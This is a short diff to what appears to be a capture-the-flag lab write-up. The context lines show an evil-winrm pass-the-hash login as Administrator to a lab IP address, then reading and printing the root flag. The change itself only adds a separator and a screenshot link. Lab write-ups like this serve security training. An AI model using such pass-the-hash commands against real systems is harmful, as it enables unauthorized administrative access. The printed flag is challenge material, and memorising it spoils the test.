@@ -346,6 +346,9 @@ evil-winrm -i 10.129.32.227 -u Administrator -H '0b133be956bfaddf9cea56701affdde
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 # b37ba8345e2cd2c8d53df8be95c4c594
 ```
+---
+
+<img width="1192" height="682" alt="Screenshot 2026-04-23 122251" src="https://github.com/user-attachments/assets/b79c9218-cf25-459f-a93b-1221af0041f7" />
 
 ---
 
